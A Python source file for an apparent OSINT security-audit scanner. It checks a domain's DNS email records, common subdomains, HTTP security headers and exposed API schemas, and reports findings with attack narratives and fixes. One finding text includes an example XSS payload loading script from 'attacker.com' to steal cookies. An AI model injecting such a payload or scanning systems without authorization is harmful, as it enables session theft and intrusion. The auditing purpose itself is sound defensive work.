import socket
import subprocess
import requests
import re
from urllib.parse import urlparse
from typing import List, Dict, Any, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor

COMMON_SUBDOMAINS = [
    "app", "api", "auth", "admin", "staging", "dev", "portal", "docs",
    "cdn", "mail", "status", "dashboard", "test", "beta", "vpn",
    "collab", "room", "plus", "blog", "connect", "sso", "id", "cloud",
    "gateway", "webmail", "internal", "media", "static", "assets"
]

def detect_cdn_provider(headers: Dict[str, str], ips: List[str]) -> str:
    """Fingerprints CDN / Cloud infrastructure from response headers and IP ranges."""
    headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
    server = headers_lower.get("server", "")
    
    if "cloudflare" in server or "cf-ray" in headers_lower:
        return "Cloudflare Global CDN & DDoS Shield"
    if "vercel" in server or "x-vercel-id" in headers_lower:
        return "Vercel Edge Network"
    if "awselb" in server or "cloudfront" in server or "x-amz-cf-id" in headers_lower:
        return "AWS CloudFront / ALB"
    if "fastly" in server or "x-fastly-request-id" in headers_lower:
        return "Fastly Edge Cloud"
    if "akamai" in server or "x-akamai-transformed" in headers_lower:
        return "Akamai Intelligent Edge"
    if "google" in server or "gws" in server:
        return "Google Cloud Infrastructure"
    if "nginx" in server:
        return f"NGINX Web Server ({headers.get('server', 'nginx')})"
    if "apache" in server:
        return f"Apache HTTP Server ({headers.get('server', 'apache')})"
    return server if server else "Standard Cloud Web Server"

def audit_dns_and_email_security(target: str) -> Tuple[Dict[str, Any], List[Dict[str, Any]]]:
    """
    Performs live DNS reconnaissance and audits email authentication (SPF/DMARC)
    and Certificate Authority Authorization (CAA) posture.
    Returns (dns_intel, security_findings)
    """
    dns_intel: Dict[str, Any] = {
        "ips": [],
        "nameservers": [],
        "mail_servers": [],
        "txt_records": [],
        "dmarc": None,
        "spf": None,
        "caa": None,
        "cdn": "Direct Host"
    }
    findings: List[Dict[str, Any]] = []

    # 1. Resolve A records (IP addresses)
    try:
        resolved = socket.gethostbyname_ex(target)
        dns_intel["ips"] = resolved[2]
    except Exception:
        pass

    # 2. Query Nameservers (NS)
    try:
        ns_out = subprocess.run(["dig", "+short", "NS", target], capture_output=True, text=True, timeout=3).stdout.strip()
        if ns_out:
            dns_intel["nameservers"] = [ns.strip().rstrip(".") for ns in ns_out.split("\n") if ns.strip()]
    except Exception:
        pass

    # 3. Query Mail Servers (MX)
    try:
        mx_out = subprocess.run(["dig", "+short", "MX", target], capture_output=True, text=True, timeout=3).stdout.strip()
        if mx_out:
            dns_intel["mail_servers"] = [mx.strip().rstrip(".") for mx in mx_out.split("\n") if mx.strip()]
    except Exception:
        pass

    # 4. Query TXT Records & Check SPF
    try:
        txt_out = subprocess.run(["dig", "+short", "TXT", target], capture_output=True, text=True, timeout=3).stdout.strip()
        if txt_out:
            txt_lines = [t.strip().strip('"') for t in txt_out.split("\n") if t.strip()]
            dns_intel["txt_records"] = txt_lines
            for line in txt_lines:
                if line.startswith("v=spf1"):
                    dns_intel["spf"] = line
                    break
    except Exception:
        pass

    # 5. Query DMARC Record
    try:
        dmarc_out = subprocess.run(["dig", "+short", "TXT", f"_dmarc.{target}"], capture_output=True, text=True, timeout=3).stdout.strip()
        if dmarc_out:
            dns_intel["dmarc"] = dmarc_out.strip().strip('"')
    except Exception:
        pass

    # 6. Query CAA Record
    try:
        caa_out = subprocess.run(["dig", "+short", "CAA", target], capture_output=True, text=True, timeout=3).stdout.strip()
        if caa_out:
            dns_intel["caa"] = caa_out.strip()
    except Exception:
        pass

    # --- EVALUATE VULNERABILITIES FROM DNS AUDIT ---

    # A) DMARC Verification
    if not dns_intel["dmarc"]:
        findings.append({
            "title": "Missing DMARC Email Security Record (Phishing / Domain Spoofing Risk)",
            "category": "INFRASTRUCTURE",
            "severity": "HIGH",
            "host": target,
            "url": f"https://{target}",
            "snippet": f"No DMARC record found at _dmarc.{target}. Threat actors can forge email sender headers as @{target} without rejection.",
            "dork": f"dig TXT _dmarc.{target}",
            "surface": "DNS Perimeter (DMARC)",
            "engine": "dns_audit",
            "section": "VULNERABILITY",
            "what_is_the_bug": f"Domain {target} lacks a DMARC policy record (_dmarc.{target}).",
            "why_it_is_a_bug": (
                "Without a DMARC policy, email gateways cannot verify whether messages claiming to come from your domain "
                "actually originated from authorized servers. Adversaries can forge executive emails (@target.com) for Business Email Compromise (BEC), "
                "customer credential harvesting, and brand reputation damage."
            ),
            "attack_vector": (
                "1. Adversary configures a rogue SMTP server to send emails with 'From: ceo@" + target + "'.\n"
                "2. Recipient mail servers (Gmail, Outlook) see no DMARC record and deliver the spoofed phishing email to employee inboxes.\n"
                "3. Victims trust the authenticated appearance of the email and surrender credentials or authorize fraudulent wire transfers."
            ),
            "how_to_fix": "Publish a strict DMARC TXT record under '_dmarc." + target + "' with policy 'p=reject' or 'p=quarantine'.",
            "remediation": "Publish DNS TXT record '_dmarc." + target + "' -> 'v=DMARC1; p=reject; rua=mailto:dmarc-reports@" + target + ";'",
            "owasp_tag": "OWASP A05:2021 — Security Misconfiguration",
            "cwe_id": "CWE-358: Foundational Security Check Bypass (Domain Spoofing)",
            "cvss_score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (7.5 High)",
            "remediation_steps": [
                f"1. Create a DNS TXT record at hostname '_dmarc.{target}'.",
                "2. Set TXT value: 'v=DMARC1; p=reject; sp=reject; rua=mailto:security@" + target + "; pct=100;'",
                "3. Ensure SPF and DKIM are fully aligned across all corporate mail delivery services."
            ]
        })
    elif "p=none" in dns_intel["dmarc"]:
        findings.append({
            "title": "DMARC Policy in Monitoring Mode (p=none) — Phishing Emails Not Blocked",
            "category": "INFRASTRUCTURE",
            "severity": "MEDIUM",
            "host": target,
            "url": f"https://{target}",
            "snippet": f"DMARC record at _dmarc.{target} has policy 'p=none'. Unauthenticated spoofed emails are delivered to recipients rather than quarantined.",
            "dork": f"dig TXT _dmarc.{target}",
            "surface": "DNS Perimeter (DMARC)",
            "engine": "dns_audit",
            "section": "VULNERABILITY",
            "what_is_the_bug": f"DMARC policy for {target} is configured with p=none (reporting only).",
            "why_it_is_a_bug": "A policy of 'p=none' informs receiving mail servers not to reject or quarantine fraudulent spoofed emails. Adversaries can still successfully deliver spoofed emails pretending to be your company.",
            "attack_vector": "Attacker sends spear-phishing emails spoofing the domain. Because policy is p=none, mail servers accept the messages without restriction.",
            "how_to_fix": "Upgrade DMARC policy from 'p=none' to 'p=quarantine' and ultimately 'p=reject'.",
            "remediation": "Update DNS TXT record '_dmarc." + target + "' from 'p=none' to 'p=reject'.",
            "owasp_tag": "OWASP A05:2021 — Security Misconfiguration",
            "cwe_id": "CWE-358: Foundational Security Check Bypass",
            "cvss_score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (5.3 Medium)",
            "remediation_steps": [
                "1. Audit incoming DMARC aggregate reports (RUA) to confirm legitimate mail senders.",
                f"2. Update TXT record at '_dmarc.{target}' to 'v=DMARC1; p=quarantine;' then 'p=reject;'"
            ]
        })

    # B) CAA Record Verification
    if not dns_intel["caa"]:
        findings.append({
            "title": "Missing DNS CAA Record (Unrestricted Certificate Authority Issuance)",
            "category": "INFRASTRUCTURE",
            "severity": "LOW",
            "host": target,
            "url": f"https://{target}",
            "snippet": f"No Certificate Authority Authorization (CAA) record found for {target}. Any public CA can issue SSL certificates for this domain.",
            "dork": f"dig CAA {target}",
            "surface": "DNS Perimeter (CAA)",
            "engine": "dns_audit",
            "section": "VULNERABILITY",
            "what_is_the_bug": f"Domain {target} does not restrict which Certificate Authorities (CAs) are allowed to issue SSL/TLS certificates.",
            "why_it_is_a_bug": (
                "Without a CAA record, if any single public Certificate Authority worldwide is compromised or coerced, "
                "it can fraudulently issue trusted SSL certificates for your domain, enabling transparent Man-in-the-Middle (MitM) interception."
            ),
            "attack_vector": "Attacker leverages a compromised or rogue regional Certificate Authority to obtain a legitimate SSL certificate for your domain without your consent.",
            "how_to_fix": "Add CAA DNS records explicitly designating your approved certificate issuers (e.g. Let's Encrypt, DigiCert, Google Trust Services).",
            "remediation": f"Add DNS CAA records: '{target} CAA 0 issue \"letsencrypt.org\"' and '{target} CAA 0 issue \"pki.goog\"'",
            "owasp_tag": "OWASP A05:2021 — Security Misconfiguration",
            "cwe_id": "CWE-295: Improper Certificate Validation",
            "cvss_score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N (4.8 Low)",
            "remediation_steps": [
                f"1. In your DNS management portal for {target}, create CAA records.",
                "2. Designate authorized CAs: '0 issue \"letsencrypt.org\"', '0 issuewild \";\"' (if wildcards are prohibited)."
            ]
        })

    return dns_intel, findings

def probe_live_subdomains(target: str) -> List[Dict[str, Any]]:
    """
    Actively checks top high-probability corporate subdomains via fast DNS resolution.
    Returns list of discovered hosts with IP addresses.
    """
    discovered: List[Dict[str, Any]] = []

    def check_sub(sub: str):
        fqdn = f"{sub}.{target}".lower()
        try:
            ip = socket.gethostbyname(fqdn)
            return {
                "host": fqdn,
                "url": f"https://{fqdn}",
                "snippet": f"Active infrastructure subdomain resolved to IP: {ip}.",
                "dork": f"DNS Resolve {fqdn}",
                "engine": "dns_probe"
            }
        except Exception:
            return None

    with ThreadPoolExecutor(max_workers=12) as executor:
        results = executor.map(check_sub, COMMON_SUBDOMAINS)
        for r in results:
            if r:
                discovered.append(r)

    return discovered

def audit_http_surface_and_headers(target: str) -> Tuple[Dict[str, Any], List[Dict[str, Any]], List[Dict[str, Any]]]:
    """
    Audits live web perimeter:
    - HTTP Security Headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options)
    - Well-Known Endpoints & Exposed Schemas (/openapi.json, /.well-known/mcp, /robots.txt, etc.)
    Returns (web_profile, vulnerabilities, asset_findings)
    """
    vulnerabilities: List[Dict[str, Any]] = []
    asset_findings: List[Dict[str, Any]] = []
    profile: Dict[str, Any] = {
        "status_code": None,
        "server": None,
        "cdn": "Direct Host",
        "has_csp": False,
        "has_hsts": False,
        "x_frame_options": None
    }

    url = f"https://{target}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ReconFlow-OSINT/1.0"
    }

    try:
        resp = requests.get(url, headers=headers, timeout=6, allow_redirects=True)
        profile["status_code"] = resp.status_code
        profile["server"] = resp.headers.get("server")
        profile["cdn"] = detect_cdn_provider(resp.headers, [])

        h_lower = {k.lower(): v for k, v in resp.headers.items()}

        # 1. Content-Security-Policy (CSP)
        if "content-security-policy" in h_lower:
            profile["has_csp"] = True
        else:
            vulnerabilities.append({
                "title": "Missing Content-Security-Policy (CSP) Header",
                "category": "CONFIG_LEAK",
                "severity": "HIGH",
                "host": target,
                "url": url,
                "snippet": f"HTTP response headers on {url} do not include 'Content-Security-Policy'. Client browsers are unprotected against Cross-Site Scripting (XSS) and code injection.",
                "dork": f"curl -I {url}",
                "surface": "HTTP Security Headers",
                "engine": "headers_audit",
                "section": "VULNERABILITY",
                "what_is_the_bug": f"Production endpoint {url} does not declare a Content-Security-Policy header.",
                "why_it_is_a_bug": (
                    "Content-Security-Policy (CSP) is the browser's primary defense-in-depth barrier against Cross-Site Scripting (XSS), "
                    "clickjacking, and unauthorized data exfiltration. Without CSP, if any inline script injection or untrusted third-party script "
                    "is loaded, it can steal session tokens, log keystrokes, and compromise user accounts."
                ),
                "attack_vector": (
                    "1. Attacker finds a stored or reflected injection vector (e.g. comment field, profile name, query parameter).\n"
                    "2. Attacker injects a malicious payload: <script src='https://attacker.com/evil.js'></script>.\n"
                    "3. Because no CSP restriction is present, the victim's browser executes the script and exfiltrates cookies and auth tokens."
                ),
                "how_to_fix": "Configure a strict Content-Security-Policy HTTP response header restricting script-src, object-src, and frame-ancestors.",
                "remediation": "Add NGINX directive: add_header Content-Security-Policy \"default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none';\" always;",
                "owasp_tag": "OWASP A05:2021 — Security Misconfiguration",
                "cwe_id": "CWE-1021: Improper Restriction of Rendered UI Layers or Scripts",
                "cvss_score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N (7.5 High)",
                "remediation_steps": [
                    "1. Web Server Hardening (NGINX):\n   add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'none';\" always;",
                    "2. Next.js Config (next.config.js):\n   Add 'Content-Security-Policy' to async headers() configuration.",
                    "3. Cloudflare Transform Rule:\n   Create a Response Header Transform Rule setting 'Content-Security-Policy'."
                ]
            })

        # 2. X-Frame-Options (Clickjacking)
        xfo = h_lower.get("x-frame-options")
        if not xfo and not profile["has_csp"]:
            vulnerabilities.append({
                "title": "Missing Anti-Clickjacking Header (X-Frame-Options)",
                "category": "CONFIG_LEAK",
                "severity": "MEDIUM",
                "host": target,
                "url": url,
                "snippet": f"No 'X-Frame-Options' or CSP 'frame-ancestors' header present on {url}. The site can be embedded in malicious third-party iframes to execute Clickjacking attacks.",
                "dork": f"curl -I {url}",
                "surface": "HTTP Security Headers",
                "engine": "headers_audit",
                "section": "VULNERABILITY",
                "what_is_the_bug": f"Apex site {url} permits framing by external web origins.",
                "why_it_is_a_bug": (
                    "Clickjacking (UI Redress Attack) occurs when an attacker loads your target application inside an invisible <iframe> "
                    "layered beneath a decoy button or game. When victims click the decoy, they unwittingly click buttons inside your application, "
                    "potentially confirming payments, changing email settings, or deleting accounts."
                ),
                "attack_vector": "Attacker creates a deceptive web page with a transparent <iframe> pointing to your logged-in dashboard and tricks authenticated users into clicking sensitive UI elements.",
                "how_to_fix": "Set 'X-Frame-Options: DENY' or 'X-Frame-Options: SAMEORIGIN', or use CSP 'frame-ancestors 'self''.",
                "remediation": "Add NGINX header: add_header X-Frame-Options \"SAMEORIGIN\" always;",
                "owasp_tag": "OWASP A05:2021 — Security Misconfiguration",
                "cwe_id": "CWE-1021: Improper Restriction of Rendered UI Layers or Frames",
                "cvss_score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (6.5 Medium)",
                "remediation_steps": [
                    "1. In NGINX: add_header X-Frame-Options \"SAMEORIGIN\" always;",
                    "2. In Apache: Header always append X-Frame-Options SAMEORIGIN",
                    "3. In Next.js: configure security headers in next.config.js"
                ]
            })
        else:
            profile["x_frame_options"] = xfo

        # 3. Strict-Transport-Security (HSTS)
        hsts = h_lower.get("strict-transport-security")
        if hsts:
            profile["has_hsts"] = True
        else:
            vulnerabilities.append({
                "title": "Missing HTTP Strict Transport Security (HSTS) Header",
                "category": "CONFIG_LEAK",
                "severity": "MEDIUM",
                "host": target,
                "url": url,
                "snippet": f"No 'Strict-Transport-Security' header observed on {url}. Vulnerable to SSL-stripping and downgrade attacks.",
                "dork": f"curl -I {url}",
                "surface": "HTTP Security Headers",
                "engine": "headers_audit",
                "section": "VULNERABILITY",
                "what_is_the_bug": f"Web server at {url} does not mandate HTTPS connections via HSTS.",
                "why_it_is_a_bug": "Without HSTS, attackers on public Wi-Fi networks can execute SSL stripping attacks (e.g. sslstrip), downgrading HTTPS connections to plaintext HTTP and intercepting credentials.",
                "attack_vector": "Attacker conducts an ARP poisoning or rogue Wi-Fi attack, intercepts port 80 HTTP redirects, and strips the SSL connection before the user establishes encrypted traffic.",
                "how_to_fix": "Add 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload' header.",
                "remediation": "Add NGINX directive: add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;",
                "owasp_tag": "OWASP A05:2021 — Security Misconfiguration",
                "cwe_id": "CWE-319: Cleartext Transmission of Sensitive Information",
                "cvss_score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N (5.3 Medium)",
                "remediation_steps": [
                    "1. Web Server Hardening (NGINX):\n   add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\" always;",
                    "2. Submit domain to the HSTS Preload list at https://hstspreload.org/"
                ]
            })

        # 4. Check Link header for exposed specs and catalog files
        link_header = h_lower.get("link", "")
        if "/openapi.json" in link_header or "rel=\"service-desc\"" in link_header:
            asset_findings.append({
                "title": "Exposed OpenAPI Specification Endpoint (/openapi.json)",
                "category": "API_DOCS",
                "severity": "MEDIUM",
                "host": target,
                "url": f"https://{target}/openapi.json",
                "snippet": "Live OpenAPI 3.0 specification discovered via Link HTTP header. Exposes full REST API parameter blueprints.",
                "dork": "HTTP Link Header -> /openapi.json",
                "surface": "API Specification Console",
                "engine": "endpoint_probe",
                "section": "INFO",
                "what_is_the_bug": f"Publicly indexed OpenAPI 3.0 specification at https://{target}/openapi.json.",
                "why_it_is_a_bug": "OpenAPI definitions detail internal schema models, authentication methods, path parameters, and query parameters, allowing attackers to systematically fuzz endpoints for authorization bypasses.",
                "attack_vector": "Adversary ingests the raw JSON schema into automated fuzzers (Burp Suite, Postman) to discover unauthenticated routes and parameter injection points.",
                "how_to_fix": "If this is a private API, restrict specification access to authenticated developers or corporate IP allowlists.",
                "remediation": "Enforce authentication on API specification endpoints or add 'X-Robots-Tag: noindex' to prevent public scraping.",
                "owasp_tag": "OWASP API9:2023 — Improper Inventory Management",
                "cwe_id": "CWE-215: Insertion of Sensitive Information into Debugging Code",
                "cvss_score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (5.3 Medium)",
                "remediation_steps": [
                    "1. Restrict /openapi.json behind API key or developer portal login.",
                    "2. Inject 'X-Robots-Tag: noindex, nofollow' header on API documentation routes."
                ]
            })

    except Exception:
        pass

    # 5. Probe robots.txt for sensitive disallowed paths
    try:
        r_resp = requests.get(f"https://{target}/robots.txt", headers=headers, timeout=4)
        if r_resp.status_code == 200:
            lines = r_resp.text.split("\n")
            disallowed = []
            agentmaps = []
            for line in lines:
                l_strip = line.strip()
                if l_strip.lower().startswith("disallow:"):
                    path = l_strip.split(":", 1)[1].strip()
                    if path and path != "/":
                        disallowed.append(path)
                elif l_strip.lower().startswith("agentmap:") or l_strip.lower().startswith("schemamap:"):
                    agentmaps.append(l_strip)

            if disallowed:
                asset_findings.append({
                    "title": f"Robots.txt Disallow Policies ({len(disallowed)} Paths)",
                    "category": "INFRASTRUCTURE",
                    "severity": "LOW",
                    "host": target,
                    "url": f"https://{target}/robots.txt",
                    "snippet": f"Disallowed paths identified: {', '.join(disallowed[:5])}. Search engines are asked not to crawl these routes.",
                    "dork": f"https://{target}/robots.txt",
                    "surface": "Robots Policy File",
                    "engine": "endpoint_probe",
                    "section": "INFO",
                    "what_is_the_bug": f"Public robots.txt explicitly enumerates internal paths: {', '.join(disallowed[:4])}.",
                    "why_it_is_a_bug": "Threat actors routinely inspect robots.txt as an attack surface blueprint. Disallow directives tell attackers exactly which paths contain sensitive logic or administrative gateways.",
                    "attack_vector": "Attacker navigates directly to the disallowed routes listed in robots.txt to test for lack of authentication or forgotten staging endpoints.",
                    "how_to_fix": "Never rely on robots.txt for security. Enforce true authentication and authorization controls on all endpoints.",
                    "remediation": "Ensure all disallowed routes strictly enforce JWT/Session authentication regardless of robots.txt directives.",
                    "owasp_tag": "OWASP A01:2021 — Broken Access Control",
                    "cwe_id": "CWE-200: Exposure of Sensitive Information",
                    "cvss_score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (3.7 Low)",
                    "remediation_steps": [
                        "1. Verify that every disallowed route (/api/, /auth/) requires valid authentication tokens.",
                        "2. Remove unnecessary internal route paths from public robots.txt files."
                    ]
                })

            if agentmaps:
                for am in agentmaps[:2]:
                    asset_findings.append({
                        "title": f"Autonomous AI Agent Catalog ({am.split(':')[0]})",
                        "category": "RESOURCE",
                        "severity": "INFO",
                        "host": target,
                        "url": am.split(":", 1)[1].strip(),
                        "snippet": f"Agent metadata catalog exposed: {am}",
                        "dork": "robots.txt Agentmap directive",
                        "surface": "AI Agent Interface",
                        "engine": "endpoint_probe",
                        "section": "INFO",
                        "what_is_the_bug": f"Target exposes an AI Agent metadata catalog: {am}.",
                        "why_it_is_a_bug": "Informational discovery documenting machine-readable API catalog for LLM agents.",
                        "attack_vector": "Adversary explores agent schema specifications to locate autonomous tool invocation endpoints.",
                        "how_to_fix": "Confirm agent catalog exposes only public APIs.",
                        "remediation": "Audit autonomous agent tool actions to ensure authorization boundaries are strictly verified.",
                        "owasp_tag": "OWASP Top 10 for LLM Applications — Sensitive Information Disclosure",
                        "cwe_id": "CWE-200: Exposure of Information",
                        "cvss_score": "0.0 (Informational)"
                    })
    except Exception:
        pass

    # 6. Direct probe for /openapi.json or /swagger.json if not already found
    if not any("openapi" in f.get("title", "").lower() for f in asset_findings):
        for candidate in ["/openapi.json", "/swagger.json", "/api-docs"]:
            try:
                c_resp = requests.get(f"https://{target}{candidate}", headers=headers, timeout=3)
                if c_resp.status_code == 200 and ("openapi" in c_resp.text[:200].lower() or "swagger" in c_resp.text[:200].lower()):
                    asset_findings.append({
                        "title": f"Exposed Interactive API Schema ({candidate})",
                        "category": "API_DOCS",
                        "severity": "MEDIUM",
                        "host": target,
                        "url": f"https://{target}{candidate}",
                        "snippet": f"Directly accessible OpenAPI specification at https://{target}{candidate}.",
                        "dork": f"GET {candidate}",
                        "surface": "API Specification Console",
                        "engine": "endpoint_probe",
                        "section": "INFO",
                        "what_is_the_bug": f"Publicly accessible API schema console at https://{target}{candidate}.",
                        "why_it_is_a_bug": "Exposes full internal API endpoints, schema definitions, and parameters without authentication.",
                        "attack_vector": "Automated security scanners ingest this schema to map every available endpoint for vulnerability testing.",
                        "how_to_fix": "Enforce authentication on API specification endpoints in production environments.",
                        "remediation": "Restrict API documentation access to authenticated developers.",
                        "owasp_tag": "OWASP API9:2023 — Improper Inventory Management",
                        "cwe_id": "CWE-215: Information Exposure via Debugging Code",
                        "cvss_score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (5.3 Medium)"
                    })
                    break
            except Exception:
                pass

    return profile, vulnerabilities, asset_findings
